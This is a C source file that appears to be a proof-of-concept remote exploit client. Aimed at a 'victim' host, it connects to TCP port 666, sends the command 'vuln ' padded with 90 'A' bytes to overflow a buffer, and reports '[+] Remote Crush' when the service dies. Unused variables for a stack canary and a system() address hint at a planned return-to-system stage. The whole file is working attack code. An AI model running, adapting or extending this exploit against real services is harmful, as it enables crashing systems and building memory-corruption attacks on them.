#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>

#define PORT 666
#define BUFS 250
#define START 90


#define SA struct sockaddr


int usage(char *arg) 
{
    printf("\n\tUsage:\n\t[+] %s [options]\n",arg);
    printf("         -? <this help screen>\n");
    printf("         -v <victim>\n\n");
    exit(-1);
}

int main(int argc, char *argv[]) 
{

	int ret, *buf_addr, global_cnt = 0;
	char *buf,read_buf[4096],cannary[0x4] = { 0x0, 0x0, 0x0, 0x0};
	struct sockaddr_in servaddr;
	struct hostent *h;
	int elo, port=PORT, opt, sockfd, test=0, offset=0, test2 = 0;
	int helper = 0, position_found = 0;
	int write_addr = 0, system_addr = 0;

	struct timeval tv;

	while((opt = getopt(argc,argv,"v:?")) != -1) {
		switch(opt) {
			case 'v':
				test=1;
				if ( (h=gethostbyname(optarg)) == NULL) {
					printf("gethostbyname() failed!\n");
					exit(-1);
				}
				break;
			case '?':
			default:
				usage(argv[0]);
		}
	}

	if (test==0)
		usage(argv[0]);

	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(port);
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_addr = *(struct in_addr*)*h->h_addr_list;

	if (!(buf=(char*)malloc(BUFS))) {
		exit(-1);
	}

	setbuf(stdout,NULL);

	memset(buf,0x0,BUFS);
	strcpy(buf,"vuln ");

	memset(&buf[5], 0x41, START+global_cnt);

	if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
		printf("Socket() error!\n");
		exit(-1);
	}

	if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr))) < 0) {
		printf("Connect() error!\n");
		exit(-1);
	}
	bzero(read_buf,sizeof(read_buf));
	read(sockfd,read_buf,sizeof(read_buf));
	printf("%s\n",read_buf);

	write(sockfd,buf,strlen(buf));

	bzero(read_buf,sizeof(read_buf));
	read(sockfd,read_buf,32);
	printf("%s\n",read_buf);
	bzero(read_buf,sizeof(read_buf));
	read(sockfd,read_buf,30);
	printf("%s\n",read_buf);

	write(sockfd,"quit",4);

	bzero(read_buf,sizeof(read_buf));
	ret = read(sockfd,read_buf,sizeof(read_buf));
	printf("%s\n",read_buf);

	if(ret <= 0) {
		printf("\t[+] Remote Crush \n");
	}
	close(sockfd);

	return 0;
}

